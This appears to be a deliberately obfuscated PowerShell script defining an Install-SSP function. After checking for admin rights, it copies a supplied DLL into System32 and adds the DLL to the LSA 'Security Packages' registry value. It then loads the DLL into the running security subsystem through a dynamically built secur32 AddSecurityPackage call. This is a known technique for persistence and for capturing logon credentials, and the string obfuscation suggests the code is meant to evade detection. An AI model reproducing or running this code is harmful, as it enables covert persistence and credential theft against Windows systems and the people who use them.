  ${Y`cDt}  = [tYpe]("{4}{3}{6}{7}{5}{1}{0}{2}" -f'en','pal.windowSId','Tity','ecuR','S','CI','I','TY.pRin') ; Set-vaRIAbLE ("{1}{0}" -f'rj','f')  ( [tYpe]("{0}{2}{6}{1}{7}{4}{3}{8}{5}"-f 'S','Y.PrInCI','eCuRi','bUIL','Ows','LE','T','pal.WINd','tINro') ) ;   ${X`kW}  = [tYPe]("{2}{1}{3}{0}" -F'IlemOdE','StEM','Sy','.io.f')  ;  sV  ('x1'+'uO') ( [TYPE]("{0}{4}{2}{6}{1}{3}{5}" -F'SyStEM','c','.fiLe','C','.iO','Ess','A'))  ;    Set-IteM  ("varIaBLe:u"+"W"+"b") (  [TYpe]("{1}{0}{4}{3}{2}"-f'.','sySTEm','Ng','OdI','TeXt.asCiienc') ) ;${60Oc}  = [TYpE]("{6}{2}{1}{3}{4}{0}{5}"-f'koRig','M.io.S','te','e','E','iN','SYs');  sV  ('yAp'+'vd')  (  [TyPE]("{2}{1}{0}"-F'MaIN','dO','App') ) ;  ${8d`B6O5}=[TYpE]("{1}{3}{6}{2}{0}{4}{5}" -f 'emBlybu','Ref','.ASS','LE','IlD','ERACCESS','CTIon.emit');    Set-ITEm ("vAr"+"Iable:"+"T"+"8Cg")  ([TyPe]("{3}{5}{7}{0}{6}{4}{8}{2}{1}"-f 'o','onS','TI','Ref','al','lECT','n.c','I','lINgcoNVEn') )  ;  SET-vAriAbLe  ("{0}{1}" -f '0','zs')  ( [type]("{2}{7}{0}{6}{5}{1}{3}{4}"-f'Me.','eRvIce','rUn','S.CaLlI','NgcONVEnTIoN','Terops','IN','TI')  ); SEt ("{0}{1}" -f 'N','5m') ( [tYPE]("{0}{5}{4}{6}{8}{2}{7}{3}{1}"-F'ru','harSEt','PserV','.C','tIM','N','E.','IcES','iNTERo')  ) ;${c`7fb`dZ}  =  [TyPE]("{0}{2}{1}"-F 'I','TPtr','n');${6`O0hvP}= [TYPE]("{3}{0}{2}{5}{1}{7}{4}{6}" -f'u','in','NtIme','R','icES.MaRshA','.','l','teropSerV') ;function INStAl`l-`S`sP
{


    [CmdletBinding()] Param (
        [ValidateScript({Test-Path (Resolve-Path ${_})})]
        [String]
        ${p`Ath}
    )

    ${PrI`N`ciPaL} = [Security.Principal.WindowsPrincipal] ${yc`dt}::"G`EtCuRRe`Nt"()

    if(-not ${P`RI`NC`IPal}."I`SinRolE"(  (GI  ("{3}{0}{2}{1}" -f 'ARi','Le:frj','ab','V')).VAlUe::"Adm`I`NisTR`At`OR"))
    {
        throw 'Installing an SSP dll requires administrative rights. Execute this script from an elevated PowerShell prompt.'
    }

    
    ${FUlLDLl`p`A`Th} = Resolve-Path ${Pa`TH}

    
    function LOCAl:g`Et-peaRcHItE`C`TU`Re
    {
        Param
        (
            [Parameter( pOsITion = 0,
                        MandATory = ${TR`Ue} )]
            [String]
            ${pA`Th}
        )
    
        
        ${Fil`e`S`TreaM} = New-Object ("{3}{0}{1}{2}{4}" -f 's','tem.I','O.FileS','Sy','tream')(${Pa`Th},   ${X`KW}::"Op`eN",  (gi  ('Va'+'r'+'iaB'+'lE'+':x1uO')).vALUe::"rE`Ad")
    
        [Byte[]] ${m`zHe`A`der} = New-Object ("{0}{1}" -f 'Byte','[]')(2)
        ${F`IL`eS`TrEAM}."RE`AD"(${m`Zhe`ADER},0,2) | Out-Null
    
        ${h`EA`dER} =  ( childITEM ("VarIabLE:u"+"w"+"B") ).VaLue::"aS`CII"."gEt`StRi`Ng"(${M`ZHEad`ER})
        if (${hE`AdEr} -ne 'MZ')
        {
            ${F`IlE`sTRe`AM}."cLo`se"()
            Throw 'Invalid PE header.'
        }
    
        
        ${Fi`lEST`REAM}."S`eeK"(0x3c,   ( geT-ChilDItem ("{1}{0}{3}{4}{2}" -f 'Le','VARIAB','C',':','60O')).Value::"BE`GIn") | Out-Null
    
        [Byte[]] ${L`FaN`EW} = New-Object ("{1}{0}"-f ']','Byte[')(4)
    
        
        ${F`IlEs`TreAm}."RE`AD"(${Lf`AnEw},0,4) | Out-Null
        ${PEoF`FS`et} = [Int] ('0x{0}' -f (( ${l`F`AnEW}[-1..-4] | % { ${_}."tOst`R`ING"('X2') } ) -join ''))
    
        
        ${FIl`eStrE`AM}."se`ek"(${pE`o`FFSEt} + 4,  ( Ls  ("v"+"aRIAb"+"L"+"e:60OC")  ).ValUe::"b`eGin") | Out-Null
        [Byte[]] ${i`mAGE_`File_`m`ACh`iNe} = New-Object ("{2}{0}{1}" -f'e[',']','Byt')(2)
    
        
        ${FI`Les`TRE`Am}."rE`AD"(${ImAGe_`File`_`M`Ach`Ine},0,2) | Out-Null
        ${aRch`ITeC`T`URE} = '{0}' -f (( ${ImaGe_`FiL`E`_mACHiNe}[-1..-2] | % { ${_}."Tost`RInG"('X2') } ) -join '')
        ${FI`LESt`Ream}."Cl`ose"()
    
        if ((${A`RcHi`TeCtu`RE} -ne '014C') -and (${aRC`hiteCT`uRe} -ne '8664'))
        {
            Throw 'Invalid PE header or unsupported architecture.'
        }
    
        if (${ARcHi`TECTu`Re} -eq '014C')
        {
            Write-Output '32-bit'
        }
        elseif (${archIT`ec`TUre} -eq '8664')
        {
            Write-Output '64-bit'
        }
        else
        {
            Write-Output 'Other'
        }
    }

    ${DL`larchiT`Ec`TUre} = Get-PEArchitecture ${fu`L`ld`LlPath}

    ${OS`ARcH} = Get-WmiObject ("{1}{6}{3}{2}{0}{5}{4}" -f 'erating','Wi','Op','2_','tem','Sys','n3') | Select-Object -ExpandProperty ("{0}{2}{1}"-f'O','ture','SArchitec')

    if (${d`ll`ArcH`itE`CTURE} -ne ${O`SArcH})
    {
        throw 'The operating system architecture must match the architecture of the SSP dll.'
    }

    ${D`Ll} = Get-Item ${FULl`D`LlP`ATH} | Select-Object -ExpandProperty ("{1}{0}" -f 'e','Nam')

    
    
    ${dLl`N`Ame} = ${D`ll} | % { % {(${_} -split '\.')[0]} }

    
    ${sec`urI`Typa`ck`AgES} = Get-ItemProperty (("{8}{2}{10}{6}{5}{4}{12}{11}{1}{7}{0}{3}{9}" -f 'olSet','n','M:rAUSYST','rAUCon','r','UCu','MrA','tr','HKL','trolrAULsa','E','ntCo','re')).REPLacE('rAU','\') -Name 'Security Packages' |
        Select-Object -ExpandProperty 'Security Packages'

    if (${SeCUR`ITy`p`AcK`A`gEs} -contains ${dLlN`A`me})
    {
        throw "'$DllName' is already present in HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages."
    }

    
    ${N`ATive`I`NStA`L`lDir} = "$($Env:windir)\Sysnative"

    if (Test-Path ${NatIVe`iNsta`l`LdIR})
    {
        ${iNst`AL`lD`Ir} = ${nativ`eI`Ns`TalLDIR}
    }
    else
    {
        ${iNSta`l`l`dIR} = "$($Env:windir)\System32"
    }

    if (Test-Path (Join-Path ${iNstA`L`LD`IR} ${d`ll}))
    {
        throw "$Dll is already installed in $InstallDir."
    }

    
    Copy-Item ${ful`L`dlLp`AtH} ${INStAll`D`Ir}

    ${S`ecuRit`ypAcKA`gES} += ${dl`L`Name}

    Set-ItemProperty ((("{1}{8}{0}{4}{2}{9}{5}{6}{7}{10}{3}" -f 'Y','HKLM:','QD1CurrentContro','1Lsa','STEM','etQ','D1Contro','lQ','QD1S','lS','D'))  -cRePLace 'QD1',[cHAR]92) -Name 'Security Packages' -Value ${SEC`U`RityP`ACkages}

    ${DYnaS`S`eMblY} = New-Object ("{0}{1}{7}{4}{2}{5}{6}{3}" -f 'S','yste','e','Name','R','flecti','on.Assembly','m.')('SSPI2')
    ${assE`M`BLyBUil`Der} =   ${yAP`Vd}::"CU`Rre`NtDoma`IN"."de`FI`NED`y`NAmIcaS`semb`LY"(${dyna`S`Sem`BLY},   (  DiR ("{0}{1}{3}{2}{4}" -f'vaR','iAb','8d','le:','B6o5') ).vALUe::"r`uN")
    ${M`odULebUi`lder} = ${Assem`B`LYbu`I`LDEr}."deF`inEDyna`mI`cmOD`u`LE"('SSPI2', ${faL`sE})

    ${Ty`PebuILD`er} = ${MODUL`eBU`Il`DER}."De`F`inE`TYpe"('SSPI2.Secur32', 'Public, Class')
    ${PIn`V`OKE`m`eTHOD} = ${TY`pEbuiL`deR}."De`FinePINvo`kEm`E`THoD"('AddSecurityPackage',
        'secur32.dll',
        'Public, Static',
          ${T8`Cg}::"stA`ND`ARD",
        [Int32],
        [Type[]] @([String], [IntPtr]),
         (  gET-VarIABle ("{1}{0}" -f 'ZS','0')  -ValUeonl )::"WInA`PI",
          ${n`5M}::"AU`TO")

    ${S`Ecu`R32} = ${TYp`e`BUI`lDEr}."C`REaTET`YpE"()

    if ( ( vaRiAble ('c'+'7FbDZ') ).VAlUe::"S`Ize" -eq 4) {
        ${S`Tructs`i`ZE} = 20
    } else {
        ${S`TrucTs`ize} = 24
    }

    ${S`T`RUctpTr} =   ( gI  ("{1}{4}{3}{0}{2}"-f '0','v','hVp','BlE:6O','ARIa') ).VALUE::"AL`lo`cHgLObal"(${str`Uct`SIzE})
     (  chILDITeM ("{2}{1}{0}{3}"-f'O0H','riaBLE:6','VA','VP')  ).Value::"wrIT`e`iNt32"(${st`R`u`CTptr}, ${sTru`C`TSI`Ze})

    ${runTI`M`eSUC`Ce`SS} = ${t`Rue}

    try {
        ${rE`SU`lt} = ${s`Ec`ur32}::"AddS`E`c`U`RitypAck`Age"(${dLl`N`AME}, ${STRuC`T`pTR})
    } catch {
        ${hR`e`sult} = ${er`ROR}[0]."Excep`Ti`ON"."I`NnE`R`eXCePT`ioN"."HrESU`LT"
        Write-Warning "Runtime loading of the SSP failed. (0x$($HResult.ToString('X8')))"
        Write-Warning "Reason: $(([ComponentModel.Win32Exception] $HResult).Message)"
        ${RUN`TiMES`Uc`cE`SS} = ${f`AlsE}
    }

    if (${Ru`NT`iMESU`cCEsS}) {
        Write-Verbose 'Installation and loading complete!'
    } else {
        Write-Verbose 'Installation complete! Reboot for changes to take effect.'
    }
}